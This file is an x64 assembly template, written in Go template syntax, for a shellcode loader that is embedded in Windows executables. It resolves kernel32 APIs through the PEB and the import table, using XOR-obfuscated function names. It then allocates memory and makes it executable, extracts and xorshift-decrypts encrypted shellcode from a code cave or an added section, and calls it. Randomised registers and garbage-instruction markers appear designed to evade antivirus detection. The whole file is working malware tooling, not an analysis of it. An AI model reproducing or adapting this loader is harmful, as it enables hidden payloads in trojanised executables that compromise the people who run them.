.code64

// rdi store address of ImageBaseAddress
// rsi store address of kernel32.dll
// rbx store address of LoadLibrary
// rbp store address of GetProcAddress
// [rsp+0x08] store address of allocated memory page
// [rsp+0x10] store address of VirtualAlloc
// [rsp+0x18] store address of VirtualFree
// [rsp+0x20] store address of VirtualProtect
// [rsp+0x28] store address of CreateThread
// [rsp+0x30] store address of WaitForSingleObject

entry:
  // ensure stack is 16 bytes aligned
  push rbp
  mov rbp, rsp
  and rsp, 0xFFFFFFFFFFFFFFF0
  push rbp

  // reserve stack for store variables
  sub rsp, 0x48

// get necessary procedure address
{{if .LackProcedure}}
  // push kernel32 module name to stack
  mov {{.Reg.rax}}, {{index .Kernel32DLLDB 0}}                 {{igi}}
  mov {{.Reg.r8}},  {{index .Kernel32DLLKey 0}}                {{igi}}
  xor {{.Reg.rax}}, {{.Reg.r8}}                                {{igi}}
  push {{.Reg.rax}}                                            {{igi}}
  mov {{.Reg.rbx}}, {{index .Kernel32DLLDB 1}}                 {{igi}}
  mov {{.Reg.r9}},  {{index .Kernel32DLLKey 1}}                {{igi}}
  xor {{.Reg.rbx}}, {{.Reg.r9}}                                {{igi}}
  push {{.Reg.rbx}}                                            {{igi}}

  {{if .LoadLibraryWOnly}}
    mov {{.Reg.rcx}}, {{index .Kernel32DLLDB 2}}
    mov {{.Reg.r10}}, {{index .Kernel32DLLKey 2}}
    xor {{.Reg.rcx}}, {{.Reg.r10}}
    push {{.Reg.rcx}}
    mov {{.Reg.rdx}}, {{index .Kernel32DLLDB 3}}
    mov {{.Reg.r11}}, {{index .Kernel32DLLKey 3}}
    xor {{.Reg.rdx}}, {{.Reg.r11}}
    push {{.Reg.rdx}}
  {{end}}

  // get pointer to the PEB
  xor {{.Reg.rax}}, {{.Reg.rax}}
  mov {{.Reg.rax}}, 0x60
  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]
  // store image base address
  mov {{.RegN.rdi}}, [{{.Reg.rbx}} + 0x10]

  // read the LoadLibraryA/W form IAT
  mov {{.RegN.rbx}}, {{.RegN.rdi}}
  add {{.RegN.rbx}}, {{hex .LoadLibrary}}
  mov {{.RegN.rbx}}, [{{.RegN.rbx}}]

  // load kernel32.dll
  mov rcx, rsp
  sub rsp, 0x20
  call {{.RegN.rbx}}
  add rsp, 0x20

  // store the handle of kernel32.dll
  mov {{.RegN.rsi}}, rax

  // restore stack for kernel32 module name
  {{if .LoadLibraryWOnly}}
    add rsp, 4*8
  {{else}}
    add rsp, 2*8
  {{end}}

  // read the GetProcAddress form IAT
  mov {{.RegV.rax}}, {{.RegN.rdi}}
  add {{.RegV.rax}}, {{hex .GetProcAddress}}
  mov {{.RegN.rbp}}, [{{.RegV.rax}}]

  // get procedure address of VirtualAlloc
  {{if .LackVirtualAlloc}}
    // push procedure name to stack
    mov {{.RegV.rax}}, {{index .VirtualAllocDB 0}}
    mov {{.RegV.r8}},  {{index .VirtualAllocKey 0}}
    xor {{.RegV.rax}}, {{.RegV.r8}}
    push {{.RegV.rax}}
    mov {{.RegV.rcx}}, {{index .VirtualAllocDB 1}}
    mov {{.RegV.r9}},  {{index .VirtualAllocKey 1}}
    xor {{.RegV.rcx}}, {{.RegV.r9}}
    push {{.RegV.rcx}}
    // call GetProcAddress
    mov rcx, {{.RegN.rsi}}
    mov rdx, rsp
    sub rsp, 0x20
    call {{.RegN.rbp}}
    add rsp, 0x20
    // restore stack for procedure name
    add rsp, 2*8
    // store procedure address to stack
    mov [rsp+0x10], rax
  {{else}}
    mov {{.RegV.rcx}}, {{.RegN.rdi}}
    add {{.RegV.rcx}}, {{hex .VirtualAlloc}}
    mov {{.RegV.rcx}}, [{{.RegV.rcx}}]
    mov [rsp+0x10], {{.RegV.rcx}}
  {{end}}

  // get procedure address of VirtualProtect
  {{if .LackVirtualProtect}}
    // push procedure name to stack
    mov {{.RegV.rax}}, {{index .VirtualProtectDB 0}}
    mov {{.RegV.r8}},  {{index .VirtualProtectKey 0}}
    xor {{.RegV.rax}}, {{.RegV.r8}}
    push {{.RegV.rax}}
    mov {{.RegV.rcx}}, {{index .VirtualProtectDB 1}}
    mov {{.RegV.r9}},  {{index .VirtualProtectKey 1}}
    xor {{.RegV.rcx}}, {{.RegV.r9}}
    push {{.RegV.rcx}}
    // call GetProcAddress
    mov rcx, {{.RegN.rsi}}
    mov rdx, rsp
    sub rsp, 0x20
    call {{.RegN.rbp}}
    add rsp, 0x20
    // restore stack for procedure name
    add rsp, 2*8
    // store procedure address to stack
    mov [rsp+0x20], rax
  {{else}}
    mov {{.RegV.rdx}}, {{.RegN.rdi}}
    add {{.RegV.rdx}}, {{hex .VirtualProtect}}
    mov {{.RegV.rdx}}, [{{.RegV.rdx}}]
    mov [rsp+0x20], {{.RegV.rdx}}
  {{end}}

  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    {{if .LackCreateThread}}
      // push procedure name to stack
      mov {{.RegV.rax}}, {{index .CreateThreadDB 0}}
      mov {{.RegV.r8}},  {{index .CreateThreadKey 0}}
      xor {{.RegV.rax}}, {{.RegV.r8}}
      push {{.RegV.rax}}
      mov {{.RegV.rcx}}, {{index .CreateThreadDB 1}}
      mov {{.RegV.r9}},  {{index .CreateThreadKey 1}}
      xor {{.RegV.rcx}}, {{.RegV.r9}}
      push {{.RegV.rcx}}
      // call GetProcAddress
      mov rcx, {{.RegN.rsi}}
      mov rdx, rsp
      sub rsp, 0x20
      call {{.RegN.rbp}}
      add rsp, 0x20
      // restore stack for procedure name
      add rsp, 2*8
      // store procedure address to stack
      mov [rsp+0x28], rax
    {{else}}
      mov {{.RegV.r8}}, {{.RegN.rdi}}
      add {{.RegV.r8}}, {{hex .CreateThread}}
      mov {{.RegV.r8}}, [{{.RegV.r8}}]
      mov [rsp+0x28], {{.RegV.r8}}
    {{end}}
  {{end}}

  // get procedure address of WaitForSingleObject
  {{if .NeedWaitThread}}
    {{if .LackWaitForSingleObject}}
      // ensure stack is 16 bytes aligned
      push {{.RegV.rax}}
      // push procedure name to stack
      mov {{.RegV.rax}}, {{index .WaitForSingleObjectDB 0}}
      mov {{.RegV.r8}},  {{index .WaitForSingleObjectKey 0}}
      xor {{.RegV.rax}}, {{.RegV.r8}}
      push {{.RegV.rax}}
      mov {{.RegV.rcx}}, {{index .WaitForSingleObjectDB 1}}
      mov {{.RegV.r9}},  {{index .WaitForSingleObjectKey 1}}
      xor {{.RegV.rcx}}, {{.RegV.r9}}
      push {{.RegV.rcx}}
      mov {{.RegV.rdx}}, {{index .WaitForSingleObjectDB 2}}
      mov {{.RegV.r10}}, {{index .WaitForSingleObjectKey 2}}
      xor {{.RegV.rdx}}, {{.RegV.r10}}
      push {{.RegV.rdx}}
      // call GetProcAddress
      mov rcx, {{.RegN.rsi}}
      mov rdx, rsp
      sub rsp, 0x20
      call {{.RegN.rbp}}
      add rsp, 0x20
      // restore stack for procedure name
      add rsp, 4*8
      // store procedure address to stack
      mov [rsp+0x30], rax
    {{else}}
      mov {{.RegV.r9}}, {{.RegN.rdi}}
      add {{.RegV.r9}}, {{hex .WaitForSingleObject}}
      mov {{.RegV.r9}}, [{{.RegV.r9}}]
      mov [rsp+0x30], {{.RegV.r9}}
    {{end}}
  {{end}}

{{else}}
  // get pointer to the PEB
  xor {{.Reg.rax}}, {{.Reg.rax}}
  mov {{.Reg.rax}}, 0x60
  mov {{.Reg.rbx}}, gs:[{{.Reg.rax}}]
  // store image base address
  mov {{.RegN.rdi}}, [{{.Reg.rbx}} + 0x10]
  // get procedure address of VirtualAlloc
  mov {{.RegV.rcx}}, {{.RegN.rdi}}
  add {{.RegV.rcx}}, {{hex .VirtualAlloc}}
  mov {{.RegV.rcx}}, [{{.RegV.rcx}}]
  mov [rsp+0x10], {{.RegV.rcx}}
  // get procedure address of VirtualProtect
  mov {{.RegV.rdx}}, {{.RegN.rdi}}
  add {{.RegV.rdx}}, {{hex .VirtualProtect}}
  mov {{.RegV.rdx}}, [{{.RegV.rdx}}]
  mov [rsp+0x20], {{.RegV.rdx}}
  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    mov {{.RegV.r8}}, {{.RegN.rdi}}
    add {{.RegV.r8}}, {{hex .CreateThread}}
    mov {{.RegV.r8}}, [{{.RegV.r8}}]
    mov [rsp+0x28], {{.RegV.r8}}
  {{end}}
  // get procedure address of WaitForSingleObject
  {{if .NeedWaitThread}}
    mov {{.RegV.r9}}, {{.RegN.rdi}}
    add {{.RegV.r9}}, {{hex .WaitForSingleObject}}
    mov {{.RegV.r9}}, [{{.RegV.r9}}]
    mov [rsp+0x30], {{.RegV.r9}}
  {{end}}
{{end}} // LackProcedure

  // allocate memory for shellcode
  mov rax, [rsp+0x10]
  xor rcx, rcx
  mov rdx, {{hex .MemRegionSize}}
  mov r8, 0x3000  // MEM_RESERVE|MEM_COMMIT
  mov r9, 0x04    // PAGE_READWRITE
  sub rsp, 0x20
  call rax
  add rsp, 0x20

  // store allocated memory address
  mov [rsp+0x08], rax

  // padding garbage data to page
  mov {{.RegV.rdx}}, rax
  mov {{.RegV.rcx}}, {{hex .EntryOffset}}
  // calculate a random seed from registers
  add {{.RegV.rax}}, {{.Reg.rbx}}
  add {{.RegV.rax}}, {{.Reg.rcx}}
  add {{.RegV.rax}}, {{.Reg.rdx}}
  add {{.RegV.rax}}, {{.Reg.rsi}}
  add {{.RegV.rax}}, {{.Reg.rdi}}
  add {{.RegV.rax}}, {{.Reg.r8}}
  add {{.RegV.rax}}, {{.Reg.r9}}
  add {{.RegV.rax}}, {{.Reg.r10}}
  add {{.RegV.rax}}, {{.Reg.r11}}
 loop_padding:
  // it will waste some loop but clean code
  call xor_shift
  mov [{{.RegV.rdx}}], {{.RegV.rax}}
  // check padding garbage is finish
  inc {{.RegV.rdx}}
  dec {{.RegV.rcx}}
  jnz loop_padding

  // adjust memory region protect
  mov rax, [rsp+0x20]
  mov rcx, [rsp+0x08]
  sub rsp, 0x10 // for store old protect
  mov rdx, {{hex .MemRegionSize}}
  mov r8, 0x40 // PAGE_EXECUTE_READWRITE
  mov r9, rsp
  sub rsp, 0x20
  call rax
  add rsp, 0x20
  add rsp, 0x10 // restore stack

// read shellcode from different source
{{if .CodeCave}}
  // extract encrypted shellcode from code cave
  mov {{.RegN.rbx}}, {{hex .ShellcodeKey}}
  mov {{.RegN.rdi}}, [rsp+0x08]
  add {{.RegN.rdi}}, {{hex .EntryOffset}}
  {{STUB CodeCaveMode STUB}}
{{end}} // CodeCave

{{if or .ExtendSection .CreateSection}}
  // save rsi and rdi
  push rsi
  push rdi

  // extract encrypted shellcode from section
  mov rsi, {{.RegN.rdi}}
  add rsi, {{hex .ShellcodeOffset}}
  mov rdi, [rsp+0x18]
  add rdi, {{hex .EntryOffset}}
  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
 loop_extract:
  movsb
  inc rsi
  // check extract shellcode is finish
  dec {{.RegV.rcx}}
  jnz loop_extract

  // restore rdi and rsi
  pop rdi
  pop rsi

  // decrypt shellcode in the memory page
  mov {{.RegV.rax}}, {{hex .ShellcodeKey}}
  mov {{.RegV.rdx}}, [rsp+0x08]
  add {{.RegV.rdx}}, {{hex .EntryOffset}}
  mov {{.RegV.rcx}}, {{hex .ShellcodeSize}}
 loop_decrypt:
  mov {{.RegV.r8}}, [{{.RegV.rdx}}]
  xor {{.RegV.r8}}, {{.RegV.rax}}
  mov [{{.RegV.rdx}}], {{.RegV.r8}}
  // update the key with xorshift64
  call xor_shift
  // check decrypt shellcode is finish
  add {{.RegV.rdx}}, 8
  sub {{.RegV.rcx}}, 8
  jnz loop_decrypt
{{end}} // SectionMode

  // get the shellcode entry point
  mov {{.RegV.rax}}, [rsp+0x08]
  add {{.RegV.rax}}, {{hex .EntryOffset}}

  // call the shellcode
  sub rsp, 0x20
  call {{.RegV.rax}}
  add rsp, 0x20

  // restore stack for store variables
  add rsp, 0x48

  // restore stack and rbp
  pop rbp                                                      {{igi}}
  mov rsp, rbp                                                 {{igi}}
  pop rbp                                                      {{igi}}

  // mark the end of loader
  {{db .EndOfLoader}}

xor_shift:
  mov {{.RegV.r8}}, {{.RegV.rax}}
  shl {{.RegV.r8}}, 13
  xor {{.RegV.rax}}, {{.RegV.r8}}
  mov {{.RegV.r8}}, {{.RegV.rax}}
  shr {{.RegV.r8}}, 7
  xor {{.RegV.rax}}, {{.RegV.r8}}
  mov {{.RegV.r8}}, {{.RegV.rax}}
  shl {{.RegV.r8}}, 17
  xor {{.RegV.rax}}, {{.RegV.r8}}
  ret
